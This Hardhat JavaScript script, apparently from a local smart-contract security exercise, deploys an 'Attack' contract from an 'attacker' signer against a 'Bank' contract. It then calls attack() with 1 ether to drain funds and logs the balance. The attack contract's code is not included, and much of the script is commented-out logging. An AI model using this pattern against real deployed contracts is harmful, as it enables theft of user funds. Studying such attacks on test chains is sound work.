// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
    const signers = await ethers.getSigners();
    const attacker = signers[3];
    const Attack = await hre.ethers.getContractFactory("Attack", attacker)
    const address = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
    const attack = await Attack.deploy(address);

//     const bank =await  hre.ethers.getContractAt("Bank", address);
// const bankBalance = await contractWithWallet.getBalance()
// console.log(bankBalance);
    // let userBalance = await hre.ethers.provider.getBalance(signers[1].address);
    // console.log("USER BALANCE")
    // console.log(userBalance)
    //   let balance = await attack.getBalance();
    // console.log(" BALANCE")
    // console.log(balance)
    // ok I've dep
    await attack.attack({value: ethers.utils.parseEther("1")});
    // now we want to 
     balance = await attack.getBalance();
      console.log(" BALANCE")
    console.log(balance)
    
    //  userBalance = await hre.ethers.provider.getBalance(signers[1].address);
    // console.log("USER BALANCE")
    // console.log(userBalance)


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});